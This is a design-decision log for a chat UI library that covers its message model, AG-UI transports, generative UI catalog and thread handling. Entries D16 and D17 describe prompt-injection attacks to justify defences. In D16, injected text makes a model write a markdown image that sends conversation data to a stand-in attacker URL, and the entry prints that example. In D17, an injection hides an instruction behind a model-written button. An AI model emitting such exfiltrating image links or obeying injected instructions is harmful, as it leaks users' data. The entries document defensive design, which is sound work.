# Design Decisions

This log records the significant design choices in Hoist Chat Kit and the reasons for them. Each
entry states the decision, the context, and the alternatives we rejected. Add new entries at the
end. When a later decision replaces an earlier one, mark the old entry as superseded and link to
the new one.

## D1. A standalone package that follows Hoist's own conventions

**Decision.** The kit is its own npm package, `@xh/hoist-chat-kit`, with `@xh/hoist` as a peer
dependency. It ships TypeScript and SCSS source, as hoist-react does. Its code follows the Hoist
conventions in full: `HoistModel` for state, `hoistCmp` components with element factories, TC39
decorators, and `xh-` BEM class names.

**Why.** Chat UIs change faster than the rest of Hoist, so the kit needs its own release cycle.
Apps compile it with their own build, together with Hoist, so the kit adds no build step of its
own.

## D2. The kit owns its message model, and protocols plug in as adapters

**Decision.** A message is an immutable `ChatMessage` that holds an ordered list of typed parts:
text, reasoning, tool call, file, source and data. Components render this model only. No
component sees a provider's or a protocol's wire format.

**Why.** The agent-to-UI protocols are young and still move. AG-UI reached 1.0 in October 2026,
and A2UI is a release candidate. Our own model keeps that churn out of app code. The part types
and the tool call states follow the Vercel AI SDK `UIMessage` vocabulary, which most chat
libraries share. That keeps each adapter small.

**Alternatives.** Use AG-UI messages or AI SDK messages as the model. Both would tie apps to one
protocol and to its release cycle.

## D3. Messages are immutable records, replaced on change

**Decision.** `ChatModel.messages` is an `@observableRef` array of immutable `ChatMessage`
objects. Each streamed change makes a new message and new objects for the changed parts only.

**Why.** This follows the Hoist `StoreRecord` precedent. Memoized components then re-render only
the message and the part that changed. Plain records also serialize for storage with no extra
code.

**Alternatives.** Observable message objects that mutate in place. That is more MobX-native, but
it needs class instances for every part and custom serialization.

## D4. AG-UI 1.0 events are the wire vocabulary

**Decision.** Transports yield `ChatEvent`s. These are the AG-UI 1.0 events, with the same type
strings and field names. The kit mirrors the types and does not depend on `@ag-ui/*` at runtime.
Kit-specific content travels as AG-UI `CUSTOM` events with the `xh.chat.` name prefix.

**Why.** AG-UI is MIT-licensed, and agent frameworks such as LangGraph, Mastra, Pydantic AI and
Google ADK emit it. Its events map almost one to one onto our parts. Any AG-UI server therefore
works with the kit and needs no adapter. A Hoist server can emit the same events as NDJSON, so we
do not invent a protocol of our own.

**Alternatives.** A kit-native event format. That adds one more protocol for server authors to
learn and gives no interop. A runtime dependency on `@ag-ui/core` pulls in `zod` as a peer for
types we can mirror in one file.

## D5. Codecs translate wire formats, transports carry them

**Decision.** A `ChatTransport` gets events from a backend. A `ChatCodec` encodes the request
body and decodes the records that come back. `HoistChatTransport` reads NDJSON with
`XH.fetchNdjson`. `SseChatTransport` reads Server-Sent Events (SSE). `AgUiCodec` speaks AG-UI.
`AnthropicCodec` speaks the Anthropic Messages API.

**Why.** Framing (NDJSON or SSE) and format (AG-UI or Anthropic) change independently. With
`AnthropicCodec`, a Hoist server can relay Anthropic's stream line by line and translate nothing.
The translation then lives once, in tested TypeScript, rather than in each app's server.

## D6. NDJSON through `XH.fetchNdjson` is the default transport

**Decision.** `HoistChatTransport` posts to a hoist-core endpoint and reads the reply with
`XH.fetchNdjson`. D14 covers how it cancels a stream.

**Why.** It reuses Hoist's auth, correlation IDs, tracing, activity tracking and error decoding.
Hoist apps already have a hoist-core server, and `renderNDJSON` already pairs with
`fetchNdjson`.

**Gap.** `BaseController.renderNDJSON` flushes after the first row, then every 32 KB. Token
streaming needs a flush after each line, so the Toolbox controller writes the stream itself. A
streaming option for hoist-core, with a flush per line and disconnect detection, would remove
that code from every app.

## D7. The client runs the tool loop

**Decision.** `ChatModel` runs the agent loop for client tools. When a model call ends with tool
calls that have a client `execute`, the model runs them, sends the results back, and starts the
next call, up to `maxSteps`. Tools the backend runs arrive with their results in the stream, and
the model only displays them.

**Why.** Many chat tools act on the app itself: they change a dashboard or open a view. Only the
browser can run those. The Toolbox weather agent works this way. A server-side agent loop still
works, because the backend then sends both the calls and the results.

## D8. Generative UI goes through data parts and a renderer registry

**Decision.** AG-UI `ACTIVITY_SNAPSHOT` events and `xh.chat.data` events become `data` parts. An
app renders them through `ChatModelConfig.dataRenderers`, keyed by `dataType`. A data part with no
renderer shows as JSON. The kit ships no A2UI, OpenUI or MCP Apps renderer in v1.

**Why.** A2UI v1.0 is a release candidate with no official React renderer. OpenUI is
vendor-driven. A correct MCP Apps host needs a sandbox origin and a postMessage bridge, which
need security review. The seam lets each of these plug in later with no change to the core.

**Note.** "Open UI" in the brief is taken to mean Thesys OpenUI, the generative UI framework.
The W3C Open UI group standardizes HTML controls and does not relate to agents.

## D9. Desktop components first, platform-neutral models

**Decision.** v1 ships desktop components only, in `desktop/cmp/chat`. `core/`, `transport/` and
`cmp/` do not import from `@xh/hoist/desktop`.

**Why.** The first consumers are desktop dashboards. A mobile package can follow with no change
to the models.

## D10. CSS class and variable names use the `xh-chat` prefix

**Decision.** Class names are `xh-chat-*` in BEM form. Theme variables are `--xh-chat-*`, with
defaults built from Hoist variables.

**Why.** The `xh-` prefix marks XH library code. The kit is an XH library, and the `chat`
segment keeps it clear of names that hoist-react may add.

## D11. CodeQL runs only when the repo is public

**Decision.** The CodeQL job checks the repo visibility and skips its analysis while the repo is
private.

**Why.** Code scanning on a private repo needs GitHub Code Security, which this repo does not
have. The check turns the scan on by itself when the repo goes public.

## D12. The build check packs the package

**Decision.** `pnpm build` packs the package and checks the contents. Every source package must
ship, and specs and planning files must not.

**Why.** The kit ships source, so there is no compile output to build. A missing `files` entry
is the failure a source package is most likely to ship by mistake.

## D13. Finish reasons use the Vercel AI SDK vocabulary

**Decision.** A codec maps the provider's stop reason to one of `stop`, `length`, `tool-calls`,
`content-filter` or `other`, and records it as `metadata.finishReason` on the assistant message.
The raw provider value goes in `metadata.stopReason`.
`ChatModel` adds one value of its own, `max-steps`, for a turn that hit its `maxSteps` limit.

**Why.** Apps that show "the reply was cut off" or "the model declined" need one set of values
across providers. The AI SDK set is the one most chat code already knows.

## D14. Streams abort through `fetchOpts.signal`, not `autoAbortKey`

**Decision.** `HoistChatTransport` and `SseChatTransport` pass their own `AbortSignal` to the
native fetch through `fetchOpts.signal`. They combine it with the turn's signal through
`AbortSignal.any`.

**Why.** Hoist releases an `autoAbortKey` as soon as the response headers arrive. After that,
`XH.fetchService.abort(key)` returns false and the body keeps streaming, so the server keeps
generating tokens. A signal on the native fetch cancels the body too.

**Cost.** `AbortSignal.any` needs a 2024-or-later browser. That is inside the default Hoist
targets, which hoist-dev-utils sets to the last 2 versions of Chrome, Safari, iOS and Edge. The
signal replaces Hoist's own aborter, so Hoist's `timeout` can reject a request but not abort its
fetch. The transport closes the connection itself in that case. A `signal` option on Hoist's
`FetchOptions`, with abort support for streamed responses, would let the transports drop the
workaround.

## D15. Generative UI is a Hoist component catalog, with protocols as translators

**Decision.** The next deliverable after the chat UI is a generative UI registry. An app
registers Hoist components, such as a grid, a chart or a card, each with a typed props schema.
The kit generates the model's instructions and tools from the catalog, checks each spec the
model writes against it, and renders the result inline in the chat. Protocols such as OpenUI
Lang and A2UI translate into the same catalog specs through an adapter. v1 ships the seam
(`data` parts and `dataRenderers`) and points in this direction. The full registry follows.

**Why.** A client chose OpenUI because Hoist had no answer for chat and generative UI. The chat
UI answers the first half. The second half needs generative UI built on Hoist's own grids and
charts, which are stronger than generic component kits for data-dense apps. A catalog the app
controls keeps the model to known components and known props. XH has a proof of concept that
renders Hoist grids and charts inline in a chat in this way, under tight constraints.

**Update.** The catalog shipped in v1, as designed here: `ChatUiCatalog` in `genui/`, with the
built-in grid, chart, metrics and card in `desktop/cmp/genui/`. Each component is an inline
client tool, so streaming, validation and errors reuse the tool machinery. `ChatUiAdapter` is
the seam for A2UI and OpenUI. The kit ships the interface, and no adapter.

## D16. Markdown images do not load by default

**Decision.** `ChatMarkdown` does not load markdown images unless `allowImages` permits them.
A blocked image renders as a link, labeled with its alt text, that the user can choose to open.
An app allows images with `true`, or with a function that decides by source URL. `ChatPanel`
and `ChatMessageList` pass the setting through.

**Why.** An image sends a request to its URL the moment it renders, with no action by the user.
A prompt injection in a web page, a document or a tool result can tell the model to write an
image whose URL holds data from the conversation, such as
`![](https://attacker.example/?d=<secret>)`. The request then sends that data to the attacker's
server. Published attacks on LLM chat products have used this channel. A link needs a click,
so the user sees the URL first.

**Cost.** A model that draws charts or diagrams as markdown images shows links until the app
allows its image host. Apps that show trusted images should allow their own URLs with a
function, not all images with `true`.

**Alternatives.** Strip images entirely, with `disallowedElements`. That hides the alt text,
and the user cannot tell that the reply had an image.

## D17. A card action shows exactly what it sends

**Decision.** The built-in card's follow-up actions send their `prompt` as the user's own
message. The button's tooltip shows the prompt before the click, and the chat shows it as the
user's message after it. A prompt is at most 200 characters.

**Why.** The model writes both the button text and the prompt. The threat is the one in D16: a
prompt injection in a web page, a document or a tool result can steer what the model writes. It
could label a button "Show trades" and make its prompt an instruction the user never meant to give.
One example tells an agent to send data somewhere. A click then sends that instruction with the
user's authority. If the user sees the whole prompt before and after the click, the button cannot
claim one thing and send another unseen. The length cap keeps the whole prompt readable in a
tooltip, and leaves no room to hide a long instruction behind a short one.

**Cost.** A model cannot attach hidden context to an action. It writes the prompt as the user
would say it, and keeps any detail it needs in the conversation.

**Alternatives.** Put the prompt in the composer for the user to send. That adds a step to every
action, and the user still has to read the prompt. Show only the tooltip. A user who does not
hover would not see the prompt before it goes.

## D18. Generative UI names carry the `ChatUi` prefix

**Decision.** Every public generative UI name starts with `ChatUi` or `chatUi`. Types are
`ChatUiCatalog`, `ChatUiComponentSpec`, `ChatUiGridSpecProps` and `ChatUiGridSpecOptions`.
Components are `ChatUiGrid` and its factory `chatUiGrid`. The functions that return catalog
specs are `chatUiGridSpec()`, `chatUiChartSpec()`, `chatUiMetricsSpec()` and `chatUiCardSpec()`.

**Why.** D10 gives kit names a prefix, so that they never collide with app or Hoist names. A
bare `gridComponent()` or `GridComponentProps` would sit beside an app's own grid code. The
`Spec` suffix says what the function returns, a `ChatUiComponentSpec`, and pairs it with the
component it renders.

**Alternatives.** `chatGridComponent()` and the like. It reads well alone, but adds a third
naming scheme beside `ChatUiGrid` and `ChatUiComponentSpec`, and hides that the result is a spec.

## D19. Two conversation shapes, both first-class

**Decision.** `ChatModel` gains `historyMode: 'client' | 'server'`, default `client`. Client mode
is the first slice's behavior: the browser holds the history and runs the tool loop. In server
mode the request carries only the new messages, a `trigger` (`submit`, `retry`, `regenerate` or
`edit`) and a stable `turnId`. The server's thread, message and run ids replace the browser's.

**Why.** Three enterprise apps reviewed the kit, and all three keep the conversation in a separate
agent service that owns the loop, the tools and the threads. None runs a tool in the browser. The
client shape still serves helper agents on Hoist components, so neither shape replaces the other.
Updates D7.

## D20. A thread layer in the kit

**Decision.** `ChatThreadStore` is an adapter the app implements against its backend: list,
load, rename and delete threads. `ChatThreadsModel` holds one `ChatModel` per open thread, so a
turn keeps running in the background while the user reads another thread. `chatThreadList`
renders the list. The concurrency rules one app's tests pin down become the model's spec.

**Why.** All three apps built a thread sidebar by hand, each with the same race bugs to avoid. A
store adapter keeps the kit out of each backend's storage format.

## D21. A workspace shell

**Decision.** `chatWorkspace` lays out a thread sidebar, the conversation and an optional side
panel, on Hoist `PanelModel`, sized to its parent.

**Why.** One app's largest cost was working around a third-party chat shell: CSS overrides, DOM
observers and a rebuilt composer. Another built the same layout on Hoist `Panel` by hand.

## D22. Generative UI binds data by reference, through four delivery modes

**Decision.** One catalog, delivered four ways: display tools that the server answers, client
tools (built), component tags in markdown, and a UI document in the text stream. A `ref` prop
names an artifact, such as a result set from a tool. The kit resolves it through an artifact
registry and an app-supplied `ChatDataSource` that fetches by page. The catalog exports its tool
schemas, prompt and a version hash, so a server agent can register it. Updates D15.

**Why.** In both apps that use generative UI, the model writes a view over data that a server tool
produced, and the client fetches and formats the rows. That keeps large data out of the token
stream and keeps numbers exact. A server-run loop also cannot take client tools.

## D23. An activity timeline, and one tool display setting

**Decision.** Agentic replies show their tool calls, reasoning and narration in one collapsible
timeline, with nested sub-agents. `ChatToolSpec.display` becomes one enum: `card`, `inline`,
`timeline`, `answer`, `pinned` or `hidden`.

**Why.** An agent that makes twenty calls per reply cannot show twenty cards, and both data apps
built a timeline by hand.

## D24. Bring your own LLM

**Decision.** A kit `ChatService` resolves a default transport from server config, so a helper
agent needs no wiring of its own. A `ChatCompletionsCodec` covers OpenAI-compatible gateways.

**Why.** Enterprises choose their own model and gateway, and most gateways speak the OpenAI chat
completions format. The codec and transport split (D5) is the seam that makes this cheap.

## D25. The hoist-core streaming companion belongs to hoist-core

**Decision.** The kit does not build `renderSSE()`, a streaming `renderNDJSON()` or a streaming
proxy mode. It keeps the documented relay controller in the transport README and in Toolbox, and
the report specifies what hoist-core should add.

**Why.** It is hoist-core code, owned by the hoist-core team.

**Status.** Filed as [xh/hoist-core#618](https://github.com/xh/hoist-core/issues/618).

## D26. Snapshots now, a beta tag when the v1.0 API settles

**Decision.** The kit keeps publishing `-SNAPSHOT` builds under `next`. An app that needs
stability pins an exact snapshot version, such as `1.0.0-SNAPSHOT.1791997893569`. The first tagged
pre-release (`1.0.0-beta.1`) follows when the plan 2 API settles.

**Why.** Exact snapshot versions are immutable on npm, so apps can pin today with no release
process. A tag earlier than that would promise a stability that the server-mode work is about to
break.

## D27. The Hoist floor is 89.0.0

**Decision.** The kit requires `@xh/hoist` 89.0.0 or later. Apps on 88 upgrade first.

**Why.** Hoist 89 is the first release with the unit test kit the kit's tests use, and it is now
released.

## D28. No Python reference agent in v1.0

**Decision.** The kit publishes its event contract (AG-UI plus `xh.chat.*`) and recorded streams
for conformance tests. It does not ship a Python reference agent.

**Why.** Agent services use many frameworks. A contract and recorded streams serve all of them,
and a service team can run them in its own CI.

## D29. AG-UI interrupts first for server-side human-in-the-loop

**Decision.** A server agent asks the user a question through the AG-UI interrupt outcome, and the
kit resumes the run with a structured answer. Where an agent cannot emit AG-UI interrupts, it
sends an `xh.chat.interrupt` custom event.

**Why.** AG-UI 1.0 standardizes the interrupt outcome and resume entries. A fallback keeps agents
on older adapters working.

## D30. Backend tool errors travel in the result's metadata

**Decision.** A `TOOL_CALL_RESULT` with `metadata.error` (the error text), or with
`metadata.isError: true` (the text as `content`), fails its call as `output-error`. An
`xh.chat.toolError` custom event does the same, for a backend that cannot set `metadata`.
`AnthropicCodec` maps a server tool result block that reports an error to the same failure.

**Why.** AG-UI's result event has no error field, so a failed backend tool showed as a success.
AG-UI's tool message has `error`, and `metadata.error` mirrors it. A custom event covers servers
on strict AG-UI libraries.

## D31. An error boundary around each message and each part

**Decision.** Each message, and each part within it, renders inside Hoist's `ErrorBoundary`. A
part that throws shows a compact note with a Details disclosure, and Hoist's exception handler
logs the error with no alert. A streaming part gets another try when its state changes, and a
data part when it is replaced.

**Why.** Renderers are app code and model-driven content, and one that throws took down the whole
list. Hoist's boundary keeps Hoist's logging. The retry on a state change lets a renderer that
throws on partial input recover, without a re-render on every flush.

## D32. The catalog refuses schema keywords it cannot check

**Decision.** The `ChatUiCatalog` constructor throws on any props schema keyword that affects
validity and that the checker does not implement, such as `$ref`, `allOf` or
`exclusiveMinimum`. It also compiles each `pattern`, and throws on one that does not compile.

**Why.** The catalog promises that the model passes only schema-valid props. A keyword the checker
skipped broke that promise unseen.

**Alternatives.** A full JSON Schema validator. It adds a dependency. Ajv, a common choice,
compiles each schema to code with `new Function`, which a strict content security policy
forbids.

## D33. File chips follow the markdown image policy

**Decision.** `ChatFileChip` loads an image at a URL only if `allowImages` permits it. An image
with inline `data` always shows.

**Why.** A backend file part with an image URL reopened the data leak that D16 closed. Inline data
loads nothing, so the user's own attachments need no policy.

## D34. A silent stream fails as a turn error, coded `stalled`

**Decision.** The HTTP transports take an `idleTimeout`. Any data resets it, including an SSE
comment or an `{"type": "xh.heartbeat"}` NDJSON record, which is never decoded. When it fires, the
transport closes the connection and yields `RUN_ERROR` with code `stalled`.

**Why.** Hoist's `timeout` covers only the wait for the response to start. A `RUN_ERROR` keeps the
stall in the conversation, with Retry, rather than an exception report. A heartbeat record lets an
NDJSON server keep a slow tool call alive without inventing an AG-UI event.

## D35. A send blocker returns the reason to wait

**Decision.** `ChatModelConfig.sendBlocker` returns why the user must wait, or null. The chat
reads it as a computed value. While it returns a reason, `canSend` is false, `sendAsync` and
`editMessageAsync` do nothing, and the composer disables Send with the reason as its tooltip and
as an accessible status.

**Why.** A reason, not a boolean, tells the user what to do next. Blocking `sendAsync` too keeps
suggestion chips and card actions from getting around the rule.

## D36. Inline calls show nothing until approved

**Decision.** An inline tool call renders no output while it waits for approval, unless its tool
sets `approvalPreview`. A denied call renders none.

**Why.** An inline call's output is the UI the user is asked to allow. Showing it before approval,
or after a denial, shows what the user has not agreed to.

## D37. A turn aborts with a `ChatAbortError` that names its reason

**Decision.** `ChatModel` aborts a turn's signal with a `ChatAbortError`, whose `reason` is a
`ChatAbortReason`: `stop`, `detach`, `clear`, `load` or `destroy`. Its `name` is `AbortError`.

**Why.** Section 2.4 of the server-mode spec passes the reason itself as the signal's `reason`.
But `signal.throwIfAborted()` and `fetch()` throw the reason as is. A bare string would then reach
Hoist's `FetchService`, which tells an abort from a network failure by the name `AbortError`, and
the kit's own abort checks. An error with that name keeps every abort an abort, and still says
why.

## D38. Only a stop cancels, and only a step in flight

**Decision.** `stop()` calls `ChatTransport.cancelAsync()` only while a step is in flight. It
passes a `ChatRunRef`: the thread id, the run id from `RUN_STARTED` (or else the step's own id),
the turn id, and the step's request. In server mode, a `detach()`, `clear()` or
`loadMessages()` with a step in flight marks the reply `metadata.detached`. A stop while a client
tool runs, or while the turn waits for the user, sends no cancel.

**Why.** Between steps no run is going on the server, so a cancel has nothing to stop, and a
detached flag would claim an answer the server is not writing. The request rides on the run ref
so that `HttpChatTransport.cancelUrl` can send the `headers` and `params` of the stopped step,
which the app builds from a request.

**Alternatives.** A separate header option for the cancel call. It duplicates `headers` for
every app that authenticates with an agent server.

## D39. A new thread's id may change once, on its first run

**Decision.** In server mode, a thread id is provisional until the first `RUN_STARTED` of the
thread. If that event reports another id, the chat adopts it. A thread starts with the
constructor, `clear()`, or `loadMessages()` with no thread id. A thread id given with history,
through `initialMessages` or `loadMessages()`, is the backend's and never changes.

**Why.** It covers both kinds of backend: one that takes the id the browser mints, and one that
mints its own on the first turn. Adopting only once keeps a misbehaving agent from moving a
thread that the thread layer has already keyed.

## D40. `AnthropicCodec` is a client-mode codec

**Decision.** `AnthropicCodec.encodeRequest()` throws for a request with `historyMode: 'server'`.

**Why.** The Messages API keeps no state, so each request must carry the whole history. A
server-owned conversation sends only the new message, which the API cannot answer. The codec
cannot know the mode when it is built, so it throws on first use, with a message that names the
mode.

## D41. The text transform sees the raw text

**Decision.** The reducer keeps the raw text of each text part of a step, and passes all of it to
`textTransform` on each change. It stores the result. A turn that ends before its stream does
still gets a final call, with `isStreaming: false`.

**Why.** Suppose a transform ran on its own earlier output plus each new delta. It would see a
tag split across deltas in pieces, such as `<thin` and `king>`, and could never strip it. Running on the
raw text makes any pure transform correct, at the cost of one call per batch per changed part.

## D42. Small additions to the server-mode spec

**Decision.** WP 1 adds these to sections 1, 2 and 4.1 of `planning/SERVER-MODE.md`:

- `ChatModel.detach()`, a public way to abort with `detach`. The thread layer and apps need it to
  leave a turn running on the server.
- A turn that ends with `aborted` tracks as `Turn stopped`, beside `Turn complete` and `Turn
  failed`, so stopped turns stay visible in activity tracking. Each track also sets Hoist's own
  `elapsed`.
- `ChatModel.setFeedbackSubmitter()` and `canSubmitFeedback`, the seam through which
  `ChatThreadsModel` supplies its store's submitter to a chat the app built.
- `ChatModel.threadId` is a getter over a private observable, so only the chat sets it.
- `hasOlderMessages` is `@bindable`, so the thread layer sets it without an action of its own.
- `runOptions` is `@bindableRef`, and each send takes a deep copy. A deep observable would put a
  MobX proxy in message metadata.
- A retry, regenerate or edit re-runs with the run options recorded on its user message.
- `ScriptedRequestContext.stepIndex` stays, read from the request, because Toolbox demos use it.

**Why.** Each fills a gap the spec leaves open, without changing its contract.
